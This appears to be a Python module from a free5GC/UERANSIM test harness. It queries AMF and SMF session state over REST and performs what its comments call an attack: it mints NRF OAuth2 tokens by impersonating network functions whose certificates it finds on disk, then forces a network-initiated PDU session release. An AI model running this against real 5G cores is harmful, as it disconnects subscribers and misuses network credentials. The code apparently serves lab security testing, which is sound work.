"""
free5gc_tools/core_state.py — Ground-Truth 5GC State Layer
==========================================================
This module is the ONLY place that talks to the live free5GC / UERANSIM
stack. It never fabricates data. Every function either returns what the
live system actually reported, or raises / returns an explicit error.

All core interaction is RESTful (HTTP against free5GC's own service-based
interfaces). Three real signal sources establish ground truth:
  1. free5GC WebConsole REST API   — subscriber profile + AMF UE context
     (AMF /namf-oam/v1/registered-ue-context → array of UEContext with
      keys: Supi, Guti, Mcc, Mnc, Tac, PduSessions[{PduSessionId, Sst,
      Sd, Dnn, SmContextRef}], CmState)
  2. SMF Nsmf interfaces (REST)    — ReleaseSMContext (the network-initiated
     release the attack drives) and the SMF OAM ue-pdu-session-info view
     (PDUAddress, UpCnxState), both reached over HTTP via the WebConsole / SBI
  3. Data-plane probe              — a ping bound to the UE's uesimtun iface
     (host-level physical confirmation only; it does not drive the UE)

If the core is OFF, or the UE is not registered, these functions report
exactly that. Nothing here invents an ACTIVE session or a success.
"""

from __future__ import annotations

import logging
import os
import subprocess
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

import requests
import yaml

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
_CFG: Dict[str, Any] = {}


def set_config(cfg: Dict[str, Any]) -> None:
    global _CFG
    _CFG = cfg


def load_config() -> Dict[str, Any]:
    global _CFG
    if _CFG:
        return _CFG
    cfg_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "config.yaml")
    with open(cfg_path) as f:
        _CFG = yaml.safe_load(f)
    return _CFG


def _fg() -> Dict[str, Any]:
    return load_config().get("free5gc", {})


def norm_supi(supi: str) -> str:
    return supi if supi.startswith("imsi-") else f"imsi-{supi}"


# ===========================================================================
# 1. free5GC WebConsole REST client (real, auth'd)
# ===========================================================================
_wc_token: str = ""
_wc_token_expiry: float = 0.0


class CoreUnavailable(RuntimeError):
    """Raised when the live 5GC backend cannot be reached. Never faked away."""


def _get_token() -> str:
    global _wc_token, _wc_token_expiry
    if _wc_token and time.time() < _wc_token_expiry:
        return _wc_token
    fg = _fg()
    url = f"{fg['webconsole_url']}/api/login"
    try:
        resp = requests.post(
            url,
            json={"username": fg["username"], "password": fg["password"]},
            timeout=5,
        )
    except requests.exceptions.RequestException as e:
        raise CoreUnavailable(f"WebConsole login unreachable at {url}: {e}") from e
    if not resp.ok:
        raise CoreUnavailable(f"WebConsole login failed: HTTP {resp.status_code}")
    _wc_token = resp.json().get("access_token", "")
    _wc_token_expiry = time.time() + 3300
    return _wc_token


def _wc_headers() -> Dict[str, str]:
    token = _get_token()
    return {"Token": token, "Authorization": f"Bearer {token}"}


def wc_get(path: str) -> requests.Response:
    """Raw GET. Returns the Response so callers can distinguish 404 from errors."""
    fg = _fg()
    try:
        return requests.get(f"{fg['webconsole_url']}{path}", headers=_wc_headers(), timeout=5)
    except requests.exceptions.RequestException as e:
        raise CoreUnavailable(f"WebConsole GET {path} unreachable: {e}") from e


def wc_put(path: str, body: Dict) -> requests.Response:
    fg = _fg()
    headers = _wc_headers()
    headers["Content-Type"] = "application/json"
    try:
        return requests.put(f"{fg['webconsole_url']}{path}", headers=headers, json=body, timeout=5)
    except requests.exceptions.RequestException as e:
        raise CoreUnavailable(f"WebConsole PUT {path} unreachable: {e}") from e


# ===========================================================================
# 1b. SMF service-based interface (Nsmf_PDUSession) — network-initiated release
# ===========================================================================
def _smf() -> Dict[str, Any]:
    return load_config().get("smf", {})


def _smf_base() -> str:
    smf = _smf()
    url = smf.get("sbi_url")
    if url:
        return url.rstrip("/")
    scheme = smf.get("scheme", "http")
    host = smf.get("host", "127.0.0.2")
    port = smf.get("port", 8000)
    return f"{scheme}://{host}:{port}"


@dataclass
class SmfReleaseResult:
    ok: bool
    status_code: int
    endpoint: str
    detail: str = ""


def smf_release_sm_context(sm_context_ref: str, access_token: str = "") -> SmfReleaseResult:
    """
    Invoke the SMF's Nsmf_PDUSession ReleaseSMContext operation directly:

        POST {smf}/nsmf-pdusession/v1/sm-contexts/{ref}/release

    This is the NETWORK-INITIATED release path (3GPP TS 23.502 §4.3.4): the SMF
    deletes the N4/PFCP session on the UPF and signals the UE through the AMF.
    The core terminates the session — the UE is not driven to release itself.

    free5GC's SBI is OAuth2-protected, so `access_token` (an NRF-signed JWT with
    scope 'nsmf-pdusession') is sent as a Bearer token. `detail` carries the SMF's
    real HTTP response body on failure — nothing is fabricated.

    `sm_context_ref` is the reference the AMF reports (e.g. 'urn:uuid:...'), which
    is exactly the key the SMF stores its SM context under. It is a single path
    segment, so it is passed literally (its ':' are not percent-encoded).
    """
    endpoint = f"{_smf_base()}/nsmf-pdusession/v1/sm-contexts/{sm_context_ref}/release"
    headers = {"Content-Type": "application/json"}
    if access_token:
        headers["Authorization"] = f"Bearer {access_token}"
    try:
        resp = requests.post(endpoint, headers=headers, data="{}", timeout=8)
    except requests.exceptions.RequestException as e:
        raise CoreUnavailable(f"SMF ReleaseSMContext unreachable at {endpoint}: {e}") from e
    ok = 200 <= resp.status_code < 300
    detail = "" if ok else (resp.text or "")[:200]
    return SmfReleaseResult(ok=ok, status_code=resp.status_code, endpoint=endpoint, detail=detail)


# ===========================================================================
# 1c. NRF access-token (OAuth2) — the credential the SBI release requires
# ===========================================================================
import glob as _glob
import re as _re

_NF_CERT_RE = _re.compile(r"([a-z0-9]+)_([0-9a-fA-F-]{36})\.pem$")


def _nrf() -> Dict[str, Any]:
    return load_config().get("nrf", {})


def _nrf_base() -> str:
    url = _nrf().get("sbi_url")
    return url.rstrip("/") if url else "http://127.0.0.10:8000"


def _cert_dir() -> str:
    root = os.path.dirname(os.path.dirname(__file__))
    cd = _nrf().get("cert_dir") or os.path.join("free5gc", "cert")
    return cd if os.path.isabs(cd) else os.path.join(root, cd)


def _consumer_identities() -> List[tuple]:
    """
    (nfType, nfInstanceId) pairs the agent can present to the NRF. These are the
    NF identities whose per-instance certificate the NRF trusts on disk
    (cert/<type>_<uuid>.pem); a pinned `nrf.consumer` overrides auto-detection.
    """
    nf = _nrf().get("consumer") or {}
    if nf.get("type") and nf.get("instance_id"):
        return [(str(nf["type"]).upper(), str(nf["instance_id"]))]
    ids: List[tuple] = []
    for path in _glob.glob(os.path.join(_cert_dir(), "*_*.pem")):
        m = _NF_CERT_RE.search(os.path.basename(path))
        if m:
            ids.append((m.group(1).upper(), m.group(2)))
    return ids


@dataclass
class TokenResult:
    ok: bool
    token: str
    detail: str
    nf_type: str = ""
    nf_instance_id: str = ""


def nrf_access_token(scope: str, target_nf_type: str = "SMF") -> TokenResult:
    """
    Request an OAuth2 access token from the NRF for <scope> (e.g.
    'nsmf-pdusession'), presenting a registered NF identity. Returns the raw NRF
    outcome — the token it issued, or the real error it returned. Nothing faked.
    """
    identities = _consumer_identities()
    if not identities:
        return TokenResult(False, "", f"no NF identity to present (no cert/<type>_<uuid>.pem under {_cert_dir()})")
    base = _nrf_base()
    last = ""
    for nf_type, nf_id in identities:
        form = {
            "grant_type": "client_credentials",
            "nfInstanceId": nf_id,
            "nfType": nf_type,
            "targetNfType": target_nf_type,
            "scope": scope,
        }
        try:
            resp = requests.post(f"{base}/oauth2/token", data=form, timeout=5)
        except requests.exceptions.RequestException as e:
            raise CoreUnavailable(f"NRF token endpoint unreachable at {base}/oauth2/token: {e}") from e
        if resp.ok:
            token = ""
            try:
                token = (resp.json() or {}).get("access_token", "")
            except Exception:
                pass
            if token:
                return TokenResult(True, token, f"NRF issued token for {nf_type} scope={scope}", nf_type, nf_id)
            last = "NRF returned HTTP 200 but no access_token"
        elif "oauth2 not enable" in (resp.text or "").lower():
            # NRF has OAuth2 disabled — the SBI accepts unauthenticated calls.
            return TokenResult(False, "", "NRF OAuth2 disabled (no token required)")
        else:
            last = f"NRF HTTP {resp.status_code} for {nf_type}: {(resp.text or '')[:160]}"
    return TokenResult(False, "", last or "NRF rejected every available NF identity")


# ===========================================================================
# 2. SMF OAM view of a PDU session (RESTful, via the WebConsole)
# ===========================================================================
def ue_pdu_session_info(sm_context_ref: str) -> Dict[str, Any]:
    """
    SMF OAM view of one PDU session, fetched over REST through the WebConsole
    (GET /api/ue-pdu-session-info/{ref} → SMF /nsmf-oam/v1/ue-pdu-session-info).

    Returns the parsed JSON (including 'PDUAddress', the UE IP, and 'UpCnxState')
    or {} if the session is unknown. Fully RESTful — no UE-side tooling.
    """
    if not sm_context_ref:
        return {}
    resp = wc_get(f"/api/ue-pdu-session-info/{sm_context_ref}")
    if not resp.ok:
        return {}
    try:
        data = resp.json()
    except Exception:
        return {}
    return data if isinstance(data, dict) else {}


def pdu_session_ip(sm_context_ref: str) -> Optional[str]:
    """UE IP for a PDU session, discovered over REST (SMF OAM). None if unknown."""
    info = ue_pdu_session_info(sm_context_ref)
    addr = str(info.get("PDUAddress", info.get("pduAddress", "")) or "").split("/")[0].strip()
    return addr or None


def user_plane_activated(sm_context_ref: str) -> Optional[bool]:
    """
    Is the user plane up for this PDU session, per the SMF (UpCnxState==ACTIVATED)?
    Returns None if the SMF has no such context (can't tell). Fully RESTful.
    """
    info = ue_pdu_session_info(sm_context_ref)
    if not info:
        return None
    state = str(info.get("UpCnxState", info.get("upCnxState", "")) or "").upper()
    return state == "ACTIVATED" if state else None


# ===========================================================================
# 3. AMF registered-UE context via WebConsole (control-plane, independent)
# ===========================================================================
def registered_ue_context(supi: str) -> Dict[str, Any]:
    """
    Query the AMF's live registered-UE context through the WebConsole.

    Returns a normalized dict:
      {"registered": bool, "cm_state": str, "pdu_sessions": [{id,sst,sd,dnn,sm_context_ref}],
       "http_status": int}
    404 CONTEXT_NOT_FOUND → registered=False (the UE is genuinely not attached).
    """
    ns = norm_supi(supi)
    resp = wc_get(f"/api/registered-ue-context/{ns}")
    if resp.status_code == 404:
        return {"registered": False, "cm_state": "DEREGISTERED", "pdu_sessions": [], "http_status": 404}
    if not resp.ok:
        return {"registered": False, "cm_state": "UNKNOWN", "pdu_sessions": [],
                "http_status": resp.status_code, "error": resp.text[:200]}
    data = resp.json()
    # AMF returns an ARRAY of UEContext (3GPP + non-3GPP access).
    ctxs = data if isinstance(data, list) else [data]
    pdu: List[Dict[str, Any]] = []
    cm_state = "IDLE"
    for c in ctxs:
        if not isinstance(c, dict):
            continue
        cm_state = c.get("CmState", c.get("cmState", cm_state))
        for s in c.get("PduSessions", c.get("pduSessions", []) or []):
            pdu.append({
                "id": int(str(s.get("PduSessionId", s.get("pduSessionId", 0))) or 0),
                "sst": s.get("Sst", s.get("sst")),
                "sd": s.get("Sd", s.get("sd")),
                "dnn": s.get("Dnn", s.get("dnn")),
                "sm_context_ref": s.get("SmContextRef", s.get("smContextRef", "")),
            })
    return {"registered": True, "cm_state": cm_state, "pdu_sessions": pdu, "http_status": 200}


def amf_pdu_session(supi: str, psi: int) -> Optional[Dict[str, Any]]:
    """
    Core-side lookup: return the AMF-reported PDU session <psi> (including its
    sm_context_ref, needed to address a network-initiated release), or None if
    the UE is not attached or has no such session.
    """
    ctx = registered_ue_context(supi)
    if not ctx.get("registered"):
        return None
    for s in ctx.get("pdu_sessions", []):
        if int(s.get("id", -1)) == int(psi):
            return s
    return None


def amf_session_active(supi: str, psi: int) -> bool:
    """Core-side ground truth: does the AMF still register PDU session <psi>?"""
    return amf_pdu_session(supi, psi) is not None


# ---------------------------------------------------------------------------
# Strict post-release probes. Unlike the lookups above, these never treat an
# error as "gone": an HTTP 401/403/5xx from the WebConsole means the state is
# UNKNOWN, so a failed lookup can never be counted as a successful release.
#   True  = positively confirmed gone (404, or present-but-without-this-session)
#   False = still there
#   None  = could not be determined
# ---------------------------------------------------------------------------
def smf_context_gone(sm_context_ref: str, statuses: Optional[List[int]] = None) -> Optional[bool]:
    """Is the SMF's SM context for this ref gone? The SMF OAM answers 404 when
    the context is unknown, and the WebConsole forwards that status unchanged.
    If `statuses` is given, the HTTP status of this lookup is appended to it
    (evidence: proves a "gone" verdict came from a real 404)."""
    if not sm_context_ref:
        return None
    resp = wc_get(f"/api/ue-pdu-session-info/{sm_context_ref}")
    if statuses is not None:
        statuses.append(resp.status_code)
    if resp.status_code == 404:
        return True
    if resp.ok:
        return False
    return None


def amf_session_gone(supi: str, psi: int, statuses: Optional[List[int]] = None) -> Optional[bool]:
    """Has the AMF stopped registering PDU session <psi>? 404 (UE context gone)
    or a 200 context without that session id counts; any other status is unknown.
    If `statuses` is given, the HTTP status of this lookup is appended to it."""
    ctx = registered_ue_context(supi)
    status = ctx.get("http_status")
    if statuses is not None:
        statuses.append(status)
    if status == 404:
        return True
    if status != 200:
        return None
    return all(int(s.get("id", -1)) != int(psi) for s in ctx.get("pdu_sessions", []))


def subscriber_profile(supi: str) -> Dict[str, Any]:
    """Real provisioned profile from the WebConsole subscriber DB (or {} / raises)."""
    ns = norm_supi(supi)
    plmn = _fg().get("plmn_id", "20893")
    resp = wc_get(f"/api/subscriber/{ns}/{plmn}")
    if resp.status_code == 404:
        return {}
    if not resp.ok:
        raise CoreUnavailable(f"subscriber profile HTTP {resp.status_code}")
    return resp.json() or {}


# ===========================================================================
# 4. Data-plane probe (independent, host-level physical signal)
# ===========================================================================
# The UE IP is discovered over REST (SMF OAM); this probe only inspects the host
# network and pings through the UE's tunnel interface. It does NOT drive the UE.
def _iface_for_ip(ip: str) -> Optional[str]:
    try:
        out = subprocess.run(["ip", "-o", "-4", "addr", "show"], capture_output=True, text=True, timeout=5).stdout
    except Exception:
        return None
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 4 and parts[1].startswith("uesimtun") and parts[3].split("/")[0] == ip:
            return parts[1]
    return None


def data_plane_probe(ip: Optional[str], target: str = "8.8.8.8") -> Dict[str, Any]:
    """
    Independent physical check: can traffic actually leave via the UE's tunnel
    interface for <ip> (discovered over REST)? Returns
    {"checked": bool, "up": bool, "iface": str?, "detail": str}.
    checked=False means we couldn't map the IP to a tunnel (not a failure).
    """
    if not ip:
        return {"checked": False, "up": False, "detail": "no UE IP available for this session"}
    iface = _iface_for_ip(ip)
    if not iface:
        return {"checked": False, "up": False, "detail": f"no uesimtun iface bound to {ip}"}
    try:
        rc = subprocess.run(
            ["ping", "-c", "1", "-W", "2", "-I", iface, target],
            capture_output=True, text=True, timeout=6,
        ).returncode
    except Exception as e:
        return {"checked": True, "up": False, "iface": iface, "detail": f"ping error: {e}"}
    return {"checked": True, "up": rc == 0, "iface": iface,
            "detail": f"ping via {iface} {'succeeded' if rc == 0 else 'failed'}"}


# ===========================================================================
# 5. Health / preflight
# ===========================================================================
def smf_reachable() -> bool:
    """
    True iff the SMF service-based interface answers HTTP — i.e. the core NF that
    the attack actually drives (ReleaseSMContext) is running. Any HTTP response
    (even a 404) proves the SBI is listening; a connection error / timeout means
    the 5G core is not up. This is independent of the WebConsole.
    """
    try:
        requests.get(_smf_base(), timeout=3)
        return True
    except requests.exceptions.RequestException:
        return False


@dataclass
class Health:
    webconsole: bool = False
    smf: bool = False
    detail: Dict[str, Any] = field(default_factory=dict)

    @property
    def core_up(self) -> bool:
        # The attack needs BOTH planes it touches: the WebConsole/AMF for session
        # discovery and the SMF SBI for the release. WebConsole alone is not a
        # live 5G core.
        return self.webconsole and self.smf


def core_health() -> Health:
    h = Health()
    try:
        _get_token()
        h.webconsole = True
    except CoreUnavailable as e:
        h.detail["webconsole_error"] = str(e)
    h.smf = smf_reachable()
    if not h.smf:
        h.detail["smf_error"] = f"SMF SBI not reachable at {_smf_base()}"
    return h
